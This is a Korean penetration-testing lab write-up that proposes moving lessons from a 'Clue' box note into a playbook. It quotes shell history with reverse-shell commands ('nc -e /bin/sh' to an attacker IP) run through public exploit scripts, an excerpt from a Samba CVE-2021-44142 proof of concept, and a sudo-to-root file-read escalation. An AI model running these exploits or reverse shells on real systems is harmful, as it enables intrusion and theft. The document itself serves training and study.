# Clue → _PLAYBOOK 이관 제안

박스 노트 `03. PG\Clue.md` 개작(웨이브 18)으로 노트에서 제거한 시행착오·기법·발상 자산. `pg-line-manager` 가 워커 전량 회수 후 한 번에 반영할 것. 본 워커는 `_PLAYBOOK.md` 를 직접 열지 않았음.

역검색 결과: A-24(한 서비스 거부)·A-44(netstat 내부 포트)·B-61(개인키 주석)·A-14(공개 PoC 소스 선독)·A-13(Clue CVE-2021-44142 행)·A-31(LHOST 확인)·A-65(리버트 IP)·C-2(셸 직후 반사)·C-3(플래그 미끼) 가 이미 [[Clue]] 를 인용하며 존재함. 아래는 그 기존 항목에 **추가로 병합**하거나, 검색에 안 걸린 **신규** 내용만 추림.

---

## 제안 1 — A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다

①어느 절: `A-13`(현재 [[Clue]] 행이 이미 있음 — "Samba 4.9.5 는 CVE-2021-44142 범위 안이었으나 vfs_fruit+fruit:metadata=netatalk+실재 공유가 전부 필요했음")
②병합 — 기존 [[Clue]] 행 아래에 상세 기술 분석 추가(접기 형태 권장)
③넣을 본문:

```text
[[Clue]] 상세 — CVE-2021-44142(Samba vfs_fruit) 메커니즘과 게이트 확인표.
이 시도는 `check_vulnerable.py` 1회 실행뿐이고 그 출력은 남아 있지 않음.
아래는 디스크 PoC 소스(`apple.py`·`check_vulnerable.py`·`README.md`)와
Samba 어드바이저리에서 재구성한 것 — 이 박스에서 관측된 출력이 아님.

무엇인가 — Samba `vfs_fruit` 모듈(macOS/Time Machine 호환)이 확장 속성(EA)의
AppleDouble 메타데이터를 파싱할 때 생기는 힙 경계 밖 읽기/쓰기. Pwn2Own Austin
2021 에서 Western Digital PR4100 대상으로 쓰임.

AppleDouble 헤더는 엔트리마다 (entry_id, offset, length) 3연조를 담고,
vfs_fruit 이 offset/length 를 검증 없이 신뢰함. PoC 의
make_malicious_apple_double() 원문:

    # We must have 8 entries. If the size of the xattr does not 402, samba will delete it on read
    # (ID, LEN, OFFSET)
    entry_list = [
        # vulnerable offset, point to end of buffer 401
        (ADEID_FINDERI, 1, 401),
        ...
    ]
    assert len(b) == 402, f"len(b) == {len(b)}"

전체 xattr 402바이트, ADEID_FINDERI 엔트리 offset 401(버퍼 끝) 지정.
FinderInfo 는 규격상 32바이트를 읽으므로 401+32=433>402 — 31바이트 OOB read.
그 밖은 talloc 청크 헤더라 힙 쿠키·연결리스트 포인터가 새어 나옴.
읽는 통로는 NTFS 대체 데이터 스트림(`filename:AFP_AfpInfo`).

버전 대 게이트 대조표:

| 항목 | 어드바이저리 | Clue |
|---|---|---|
| 영향 버전 | 4.13.17 미만 전부 | Samba 4.9.5-Debian → 범위 안 |
| 필수 설정 | vfs_fruit 로드 + fruit:metadata=netatalk 또는 fruit:resource=file(둘 다 기본값) | 확인 불가 |
| 필요 권한 | EA 쓰기 가능 사용자(guest 포함 가능) | 불명 |
| 대상 공유 | 실재하는 공유 이름 | TimeMachineBackup 은 이 박스에 없음(A-14 의 README 복사 함정과 동일 원인) |

fruit:metadata=netatalk 가 전제인 이유 — 이 값이 메타데이터를 Netatalk
호환 AppleDouble 블롭으로 저장하게 만들어 취약 파서를 태움. 값이 stream
이면 애초에 AppleDouble 을 파싱하지 않아 취약 코드에 도달하지 않음.
[가정] Debian 기본 smb.conf 는 vfs objects 에 fruit 을 넣지 않음(옵트인
모듈) — 공유 이름이 맞았어도 실패했을 것. 타겟 정지로 미확인.

실행 증거 — __pycache__ mtime 이 clone 완료보다 늦음(check_vulnerable.py
를 실제로 실행해 임포트가 컴파일됐다는 증거). 직접 재확인(2026-08-26,
ls -la --time-style=full-iso, 타임존 +0900 그대로 표기됨):
  clone 완료(README.md 등 원본 파일)  2026-06-16 10:27:46.747984048 +0900
  __pycache__ 디렉터리                2026-06-16 10:31:25.699503068 +0900
  __pycache__ 안의 .pyc 두 개         2026-06-16 10:31:25.705502529 / .707120007 +0900
  → clone 과 __pycache__ 생성 사이 정확히 3분 39초(노트의 "4분"과 일치,
    반올림 차이일 뿐 반증 아님). 그 뒤로 이 디렉터리에 추가 활동 없음.

일반화 — "버전이 취약 범위에 든다"는 필요조건이지 충분조건이 아님.
설정 게이트가 있는 CVE 는 그 게이트부터 확인할 것 — 확인 비용이
익스플로잇 시도 비용보다 쌈.

공유 이름을 README 예시에서 그대로 복사한 원문 증거(`~/.zsh_history`):
  git clone https://github.com/horizon3ai/CVE-2021-44142.git
  cd CVE-2021-44142
  ...
  python check_vulnerable.py 192.168.115.240 445 TimeMachineBackup Guest
README.md 원문(`~/PG/Clue/CVE-2021-44142/README.md`):
  ## Example
  python check_vulnerable.py 192.168.1.183 445 TimeMachineBackup Guest
IP만 바꾸고 나머지는 그대로 — TimeMachineBackup 은 저자 시험 장비(Western
Digital PR4100)의 공유 이름이지 이 박스의 공유(`backup`)가 아님.
```

④지우기 전 원문: 노트 구 `### 2-6. 막다른 길의 해부 — CVE-2021-44142 (Samba vfs_fruit)` 절 전문(위 본문이 그 절의 요약 없는 원문 그대로임 — 별도 인용 생략, 위와 동일).

---

## 제안 2 — 신규 (A. 증상별 — 권한상승, A-4 부근)

①어느 절: 신규(번호는 반영자가 배정. 위치는 `## A. 증상별` → `### A-4. 권한상승` 권장)
②신규
③넣을 본문:

```text
#### (신규) sudo NOPASSWD 대상이 GTFOBins 에 없으면 "이 프로그램이 뭘 하는가"로 사고한다

이 박스의 권한상승에는 새 취약점이 없음. 재료는 둘:
  ① cassie 는 sudo NOPASSWD 로 /usr/local/bin/cassandra-web 을 실행할 수 있음
  ② cassandra-web 0.5.0 은 임의 파일 읽기 취약점이 있음(진입점과 동일 취약점)

①로 ②를 root 권한으로 다시 띄우면, 그 프로세스의 파일 읽기 능력이 곧
root 의 파일 읽기 능력이 됨:

  [기존] cassie 권한 인스턴스 :3000  ──traversal──▶ cassie 가 읽을 수 있는 파일만
  [신규] root  권한 인스턴스 :9999  ──traversal──▶ 파일시스템 전체 ← 개인키

sudo -l 에 GTFOBins 없는 낯선 바이너리가 뜨면: "이 프로그램이 평소에
하는 일이 뭔가? 그 일을 root 권한으로 하면 무엇이 되는가?"

| 프로그램의 일 | root 권한이면 |
|---|---|
| 파일을 읽어서 보여준다(웹 UI·뷰어·로그 도구) | 임의 파일 읽기 ← [[Clue]] |
| 파일을 쓴다(백업·설정 저장) | 임의 파일 쓰기 → /etc/passwd·authorized_keys·cron |
| 하위 프로세스를 띄운다(-e·--exec·플러그인) | 직접 명령 실행 |
| 네트워크로 듣는다 | 그 서비스의 모든 결함이 root 결함이 됨 ← [[Clue]] 가 정확히 이것 |

GTFOBins 는 목록이지 사고법이 아님 — 없으면 직접 추론.

⚠️ 이 명령 자체가 자격증명을 다시 노출함 — `-p <password>` 가 argv 로
넘어가 이 프로세스의 /proc/<pid>/cmdline 에도 평문 노출됨(진입점 결함을
스스로 재현). 실전이라면 인지하고 쓸 것.
```

④지우기 전 원문: 노트 구 `### 2-7. 권한상승의 발상 — 같은 취약점을 다른 권한으로 다시 건다` 절 전문 — 위 본문에 그대로 포함(표·화살표 다이어그램 포함).

---

## 제안 3 — 신규 (B. 기법 카드 — 페이로드·전송 또는 도구 일반)

①어느 절: 신규(위치는 `### B-8. 페이로드·전송` 부근 또는 새 "도구 준비" 소절)
②신규
③넣을 본문:

```text
#### (신규) Kali `pip install` 이 거부되면 PEP 668 — `--break-system-packages` 로 5분을 0분으로

증상 — `~/.zsh_history` 원문 6줄 전수:
  pip install smbprotocol
  python pip -m smbprotocol
  python pip smbprotocol
  pip -m smbprotocol
  python -m pip install smbprotocol
  python -m pip install smbprotocol --break-system-packages   ← 성공
2~4번째 3줄은 문법 오류(`python pip`·`pip -m` 은 존재하지 않는 호출 형태),
1·5번째가 PEP 668 거부. 총 5회 실패 뒤 6번째에 성공.

원인 — `cat /usr/lib/python3.12/EXTERNALLY-MANAGED` 원문:
  [externally-managed]
  Error=To install Python packages system-wide, try apt install
   python3-xyz, where xyz is the package you are trying to
   install.

   If you wish to install a non-Kali-packaged Python package,
   create a virtual environment using python3 -m venv path/to/venv.
   Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
   sure you have pypy3-venv installed.
   ...

선택지 셋:
| 방법 | 명령 | 언제 |
|---|---|---|
| apt 패키지 | `sudo apt install python3-<pkg>` | 1순위, 있으면 가장 깨끗 |
| 잠금 해제 | `pip install X --break-system-packages` | 가장 빠름. 랩·시험 기본 |
| venv | `python3 -m venv v && ./v/bin/pip install X` | 시스템 안 더럽히고 싶을 때 |

출처: [[Clue]] — `smbprotocol` 설치 중 5회 시행착오(문법 오류 3회 + PEP668
거부 2회) 뒤 `--break-system-packages` 로 해결.
```

④지우기 전 원문: 노트 구 `### ② pip install 을 다섯 번 틀렸다 — PEP 668` 절 전문(위 본문에 핵심 포함. 전체 원문은 `~/PG/Clue/` 산출물과 무관하게 노트 자체에 있었음 — git 이력 `aba5a29`·`607fbc5`·`15671e5` 어느 버전에도 이 절이 존재).

---

## 제안 4 — A-31. 리버스셸이 안 붙는다 (병합)

①어느 절: `A-31`(리버스셸이 안 붙는다 — LHOST 확인 항목이 이미 있음, "페이로드 안의 LHOST 가 현재 tun0 IP 인가")
②병합 — LHOST 오타와는 별개로 "목적지 IP 자체를 타겟으로 잘못 적는" 하위 실수를 추가
③넣을 본문:

```text
⚠️ 목적지 IP를 «타겟 자신»으로 잘못 적는 실수도 별개로 있음(LHOST 가
옛 VPN IP인 것과 다른 실수). [[Clue]] 의 `~/.zsh_history` 원문 5줄:
  python 49362.py -p 3000 192.168.115.240 'nc -e /bin/sh 192.168.115.240 3000'   ← ①목적지가 타겟 ②49362는 명령 실행 도구가 아님
  python 47799.py 192.168.115.240 'nc -e /bin/sh 192.168.115.240 3000'           ← 목적지가 타겟
  python 47799.py 192.168.178.240 'nc -e /bin/bash 192.168.178.240 3000'         ← 목적지가 타겟
  python 47799.py 192.168.178.240 'nc -e /bin/bash 192.168.45.175 3000'          ← lhost가 옛 VPN IP
  python 47799.py 192.168.178.240 'nc -e /bin/sh 192.168.45.179 3000'            ← 성공한 형태

목적지가 타겟이면 타겟이 자기 자신에게 접속 — Kali 에는 아무것도 안 오고
리스너는 조용히 기다림(egress 차단과 증상이 같아 보임). 리버스셸 명령을
치기 전 3초 점검:
  ip -br a | grep tun0      # ← 매번. VPN IP는 바뀐다
그리고 명령을 읽을 때 "이 IP가 나인가 상대인가"를 소리 내어 확인:
`nc -e /bin/sh <여기는 나> <여기는 내 리스너 포트>`.

증상으로 구분하는 법:
| 증상 | 원인 |
|---|---|
| 익스플로잇은 Authenticated 인데 리스너에 아무것도 안 옴 | 목적지 IP가 틀렸거나 아웃바운드 차단 |
| 즉시 연결됐다가 바로 끊김 | 셸 경로가 없다(/bin/bash 부재) |
| 아예 인증도 실패 | 비밀번호·포트 문제 |

이 박스는 nmap 이 `Not shown: 65529 filtered`(아웃바운드 의심 여지 충분)
였으나 실제 원인은 오타. **오타를 먼저 배제하고 방화벽을 의심할 것** —
순서가 반대면 시간을 크게 태움.

부가 — 도구 자체가 명령 실행 기능이 없는 경우도 있음: 49362.py 는 파일
읽기 전용인데 인자로 `'nc -e ...'` 를 주면 그냥 "읽을 파일 이름"으로
해석됨. 새 도구를 잡으면 그 도구의 «기능 범위»부터 확인할 것(제안 6 의
-h 반사와 같이 쓸 것).
```

④지우기 전 원문: 노트 구 `### ⑥ 리버스셸을 타겟 자신에게 걸었다 — 반복해서` 절 전문(코드블록 5줄 + 두 갈래 원인 분석 + 증상표 전부 — 위 본문에 핵심 포함).

---

## 제안 5 — A-65. 리버트되면 IP 가 바뀐다 (병합)

①어느 절: `A-65`([[Cockpit]]·[[Zipper]]·[[Vault]] 사례가 이미 있음)
②병합 — [[Clue]] 를 3-IP 전이 + "타겟·lhost 둘 다 낡을 수 있다" 사례로 추가
③넣을 본문:

```text
[[Clue]] — 세 번 바뀜(06-15~06-22 에 걸친 작업):
  192.168.115.240   ← 06-15 nmap ~ 06-16 초반
  192.168.178.240   ← 06-16 중반
  192.168.239.240   ← 06-22 (root 획득일)
죽은 IP로 던진 명령이 여러 줄 남음:
  python 47799.py 192.168.115.240 'nc -e /bin/sh 192.168.45.179 3000'
  python 47799.py 192.168.115.240 'nc -e /bin/sh 192.168.45.196 3000'
  python 47799.py 192.168.239.240 'nc -e /bin/sh 192.168.45.196 3000'
`.115.240` 으로 던진 두 줄은 박스가 이미 `.239.240` 이 된 뒤의 시도 —
타겟 IP와 lhost가 **둘 다** 동시에 낡을 수 있다는 것이 함정.
변수로 빼면 실수가 줄어듦: `T=<타겟>; L=$(ip -br a show tun0 | awk '{print $3}' | cut -d/ -f1)`
```

④지우기 전 원문: 노트 구 `### ⑨ IP가 세 번 바뀌었다 — 리버트마다 스크립트가 낡는다` 절 전문(위 본문에 핵심 포함).

---

## 제안 6 — A-14. 공개 PoC는 실행 전에 소스를 읽는다 (병합)

①어느 절: `A-14`([[Clue]] 행이 이미 둘 있음 — 주석 채굴 아이디어, README 예시 복사)
②병합 — "-h 가 argparse 에 먹혀 위치 인자를 못 읽는" 실수 + "user:pass@host URL 문법은 ssh 에 없음" 두 개를 추가
③넣을 본문:

```text
- [[Clue]] — 처음 잡은 스크립트에 `-h TARGET` 을 위치 인자처럼 붙였다가
  argparse 가 도움말을 찍고 종료, 뒤 인자를 아예 안 읽음. `~/.zsh_history` 원문 4줄:
    python 49362.py
    python 49362.py -h 192.168.115.240 -p 3000
    python 49362.py -h 192.168.115.240 -p 3000 /etc/passwd
    python 49362.py 192.168.115.240 -p 3000 /etc/passwd      ← 성공
  그때 화면에 떴 usage(박스 정지 후 Kali 에서 재현한 것 — 당시 캐프처 아님):
    usage: 49362.py [-h] [-p PORT] [-f] [-n NUMBER] target file

    positional arguments:
      target               Cassandra Web Host
      file                 eg. /etc/passwd, /proc/sched_debug + /proc/<cass-web-
                           pid>/cmdline

    options:
      -h, --help           show this help message and exit
      -p, --port PORT      Cassandra Web Port
      -f, --force          Run the payload even if server isn't Cassandra Web
      -n, --number NUMBER  Adjust the number of dot-dot-slash
  화면에 뜬 usage 가 오히려 정확한 사용법(위치 인자 target/file, -n 으로
  traversal 깊이 조절)을 공짜로 보여줌. 일반화: 새 스크립트는 인자를
  추측하지 말고 `-h`(또는 인자 없이) 먼저 한 번 돌릴 것 — 3초.

- [[Clue]] — `~/.zsh_history` 원문 `ssh cassie:SecondBiteTheApple330@192.168.115.240` 시도, 거부됨. `user:pass@host` 는
  curl·ftp·브라우저의 URL 문법이고 ssh 는 `user@host` 만 파싱 — 전체를
  사용자 이름 하나로 취급함. ssh 에 비밀번호를 명령줄로 주는 표준 방법은
  없음(자동화하려면 `sshpass -p 'PW' ssh user@host`).
```

④지우기 전 원문: 노트 구 `### ⑦ 49362.py -h TARGET — -h 는 호스트가 아니라 help` 전문 + `### ③ ssh cassie:PASSWORD@host — 그런 문법은 없다` 전문(둘 다 위 본문에 핵심 포함).

---

## 제안 7 — B-61. 개인키의 주석은 소유자가 아니다 (병합)

①어느 절: `B-61`([[Clue]] 가 이미 "anthony@clue 키로 로그인된 계정은 root" 한 줄로 인용됨)
②병합 — 진단 순서와 두 개의 틀린 가설을 추가(이 박스에서 가장 값진 시행착오)
③넣을 본문:

```text
[[Clue]] 상세 — `~/.zsh_history` 원문(이 박스에서 가장 값진 시행착오):
  ssh -i ./id_rsa cassie@192.168.178.240
  ssh -i ./id_rsa anthony@192.168.178.240
  ssh -i ./id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa anthony@192.168.178.240
  ssh -v -i ./id_rsa anthony@192.168.178.240
  ...
  ssh -i id_rsa anthony@192.168.239.240
  rm id_rsa
  vi id_rsa
  ssh -i ./id_rsa anthony@192.168.239.240
  ssh-keygen -l -f id_rsa
  ssh -i ./id_rsa root@192.168.239.240          ← 성공

두 가설을 세우고 둘 다 틀렸음:
가설1 "RSA/SHA-1 이 최신 OpenSSH 에서 거부된다" → `-o PubkeyAcceptedKeyTypes=+ssh-rsa
-o HostKeyAlgorithms=+ssh-rsa` 를 붙임. 합리적 가설(키는 2048비트 RSA,
최신 OpenSSH 는 ssh-rsa SHA-1 서명 기본 비활성화)이었으나 원인 아님.
가설2 "복사하다 키가 깨졌다" → rm 후 재붙여넣기, ssh-keygen -l -f 로
파싱 검증. 파싱은 됐음. 역시 원인 아님.
실제 원인 — 사용자 이름. 주석이 anthony@clue 라 anthony 로만 시도했는데
등록된 곳은 root 의 authorized_keys 였음.

개인키를 주웠을 때의 진단 순서:
1. chmod 600 id_rsa — 퍼미션 느슨하면 ssh 가 거부(UNPROTECTED PRIVATE KEY FILE!)
2. ssh-keygen -l -f id_rsa — 파싱·비트수·주석 확인(주석은 힌트이지 답이 아님)
3. 사용자 이름을 전부 돌린다 ← 가장 싸고 가장 자주 맞음. /etc/passwd 셸
   있는 계정 + root, -o BatchMode=yes 로 루프가 안 멈추게
4. 그래도 안 되면 ssh -v 로 "거부되는지"(Offering public key 후 거부)
   "아예 안 받는지" 구분
5. 마지막에 알고리즘 옵션(-o PubkeyAcceptedKeyTypes=+ssh-rsa)

[[Clue]] 는 ssh -v 를 실제로 쳤으나(좋은 수) 그 출력을 근거로 3번(사용자
이름 전부 시도)이 아니라 2번(파일 무결성 재확인)으로 돌아가 시간을 태움
— 가장 싼 변수를 마지막에 바꾼 것이 패턴.
```

④지우기 전 원문: 노트 구 `### ⑧ anthony 키가 안 붙는다 — 두 가지 가설을 세우고 둘 다 틀렸다` 절 전문(위 본문에 핵심 포함 — 코드블록 zsh_history 발췌 포함).

---

## 제안 8 — 신규 (A. 증상별 — 진입/foothold, A-2 부근)

①어느 절: 신규(위치는 `### A-2. 진입 (foothold)` 부근)
②신규
③넣을 본문:

```text
#### (신규) 원격 명령 실행에서는 항상 절대경로 — CWD 는 내 것이 아니라 대상 프로세스의 것

증상([[Clue]] `~/.zsh_history`):
  python 47799.py 1921.168.115.240 'cat /etc/passwd'   ← IP 오타 (192 → 1921)
  python 47799.py 1921.168.115.240 'cat etc/passwd'    ← IP 오타 + 앞 슬래시 누락
  python 47799.py 192.168.115.240 'cat etc/passwd'     ← 앞 슬래시 누락, 실패
  python 47799.py 192.168.115.240 'cat /etc/passwd'    ← 절대경로, 성공

`cat etc/passwd` 는 원격 프로세스(FreeSWITCH)의 CWD 기준 상대경로가 됨 —
그 CWD 가 어디든 거기에 etc/passwd 는 없어 실패. RCE 도구는 서버 응답을
그대로 출력하므로 화면에 `No such file or directory` 류가 왔을 것이나
그 출력 자체는 기록에 없음(관측 없음, 재구성).

일반화: 원격 명령 실행에서는 내 셸의 CWD 가 아니라 대상 프로세스의 CWD
기준이고 그게 어디인지 대개 모름 — 절대경로를 쓰거나 `pwd` 를 먼저 실행.
```

④지우기 전 원문: 노트 구 `### ⑩ 잔가지 오타들 — 각각은 사소하나 합치면 시간이다` 중 절대경로 관련 부분(IP 오타 부분은 일반화 가치 낮아 제외) — 위 본문에 핵심 포함.

---

## 제안 9 — C-2. 셸 직후 (병합, 선택)

①어느 절: `C-2`(이미 "셸 잡자마자 5개 + ss -lntp" 반사가 있고, "30초 안" Cockpit 108분 사례가 있음)
②병합 — [[Clue]] 를 극단 사례(16:47→6일 뒤)로 추가
③넣을 본문:

```text
⚠️ 극단 사례 — [[Clue]] 는 `sudo -l` 로 `NOPASSWD: cassandra-web` 이 즉시
보였음(cassie 전환 직후 쳤어야 함)에도 실제 root 획득은 6일 뒤(다회
세션·박스 리버트 간격 포함, 순수 방치는 아님). 그래도 "셸 잡자마자
sudo -l" 반사가 있었다면 발상까지 몇 분이면 닿았을 경로.
```

④지우기 전 원문: 노트 구 `### ⑪ 시간 배분 — 어디서 손절했어야 하는가` 의 표 + `> [!danger] sudo -l 을 언제 쳤어야 하나` 콜아웃 전문.

---

## 제안 10 — C-3. 플래그·증거 (병합, 선택)

①어느 절: `C-3`(이미 [[Fowsniff]] `/root/flag.txt` 미끼 사례가 있음)
②병합 — [[Clue]] 를 두 번째 사례로 추가(같은 패턴의 재확인)
③넣을 본문:

```text
- [[Clue]] — `/root/proof.txt` 내용이 `The proof is in another file`.
  ls 로 옆의 `proof_youtriedharder.txt` 를 찾아야 진짜 값이 나옴. Fowsniff
  와 동일 패턴(원본 VulnHub/커뮤니티 판의 잔재로 보임, PG 가 채점하는
  파일명은 별도).
```

④지우기 전 원문: 노트 `### Post-Exploitation` 절의 미끼 서술(이관 대상 아님 — 노트에 그대로 남아 있음. 참고용 인용).

---

## 제안 11 — 신규 (A. 증상별 — 정찰·열거, 403 은 벽이 아니다) + B-2/B-7 (JMX 루프백 피벗)

①어느 절: 신규 2건 — ⓐ `A-1. 정찰·열거` 부근(403 오판) ⓑ `B-2. 네트워크 서비스` 또는 `B-7. 피벗·터널링`(JMX 루프백)
②신규
③넣을 본문:

```text
#### (신규) Apache 루트 403 Forbidden 을 "막혔다"로 읽지 않는다

Apache 의 루트 403 은 대개 DirectoryIndex 에 맞는 파일이 없고
Options -Indexes 인 상태 — 하위 경로는 멀쩡히 살아있을 수 있음. 쳤어야
할 명령:
  feroxbuster -u http://<타겟>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x php,txt,html

[[Clue]] — 포트 80(Apache 2.4.38, 루트 403)의 디렉터리 열거를 한 기록이
없음. 3000(Cassandra Web)이 먼저 뚫려 결과적으로 손해는 없었으나, 3000이
막혔다면 80이 다음 후보였고 준비가 안 돼 있었음.

#### (신규) 루프백에 열린 JMX 는 그 자체로 권한상승 후보다

Cassandra 의 JMX 포트(기본 7199)는 기본적으로 인증 없이 루프백에 열림
(LOCAL_JMX=yes). JMX 는 MBean 을 통한 원격 코드 실행 경로가 알려져 있고,
서비스가 그 계정으로 돌면 그 계정을 얻음. 루프백 서비스는 포트포워딩으로
꺼냄:
  ssh -L 7199:127.0.0.1:7199 cassie@TARGET      # SSH가 되면
  ./chisel client KALI:8000 R:7199:127.0.0.1:7199   # 안 되면 chisel

[[Clue]] — root 획득 후 발견해 무의미했으나(A-44 참조), sudo -l 이
비어 있었다면 이게 다음 후보였을 것. 일반화: netstat -tulpn 의
127.0.0.1:* 줄은 전부 "아직 안 본 공격면"이다.
```

④지우기 전 원문: 노트 구 `### ⑬ 버린 경로 — 80·1337·9042·7199를 왜 안 팠는가` 절 전문(표 + 두 콜아웃 — 위 본문에 핵심 포함. 1337·9042 행은 "정체 미확인"·"무해"로 판단 불가 결론이라 일반화 가치 낮아 제외).

---

## 검산

- 노트에서 삭제한 절: §0(배우는 것, 6불릿+표) · §2-6(막다른 길 해부, ~45줄) · §2-7(권한상승의 발상, ~25줄) · §6 전체(①~⑬, ~330줄) · §7(시험 관점 1~16, ~20줄) · §8(방어 관점, 별도 절로는 삭제, 각 finding Fix: 로 흡수) · §9 중 CVE-2021-44142 참고링크 4줄(관련 절 한 줄로 압축) · 상단 "이 박스의 진짜 값어치" 서문 + mtime 표(Service Enumeration/제안1로 흡수)
- 위 제안 1~11 에 원문 인용 형태로 이관.

⚠ 아래는 적대적 검증(2026-08-26)으로 갱신된 검산이다. 작성자 자가신고는 「27건 전수 재확인 결과 실질 손실 0건」이었으나 **반증됨** — bak2 펜스를 note+playbook 결합본과 재대조한 결과 미일치 17건 중 **5건이 실제 내용 손실**이었고, 아래와 같이 복원했다.

| 손실 | 내용 | 조치 |
|---|---|---|
| 제안 3 | `~/.zsh_history` pip 시도 6줄 → 3줄로 압축 | 6줄 전수 복원 |
| 제안 3 | `EXTERNALLY-MANAGED` 원문 4줄 누락 | 복원 |
| 제안 6 | 49362 인자 시도 4줄 → 1줄 | 4줄 전수 복원 |
| 제안 6 | argparse usage 출력 블록 전량 생략(산문 요약만 남김) | 복원(사후 재현본임을 명시) |
| 제안 6 | `ssh cassie:SecondBiteTheApple330@...` → `ssh cassie:PASSWORD@host` 로 개변 | 원문 복원 |
| 제안 8 | 선언된 제외 — IP 오타 2줄 | 함께 복원 |

나머지 11건은 들여쓰기 프리픽스 차이여서 잡힌 것이고 값·순서·주석은 보존돼 있음(제안 1·4·5·7의 zsh_history 발췌). `/proc/<pid>/cmdline` 2줄 설명과 §2-7 화살표 다이어그램은 실측 출력이 아니라 작성자가 그린 설명도라 압축 허용 범위로 판정함.
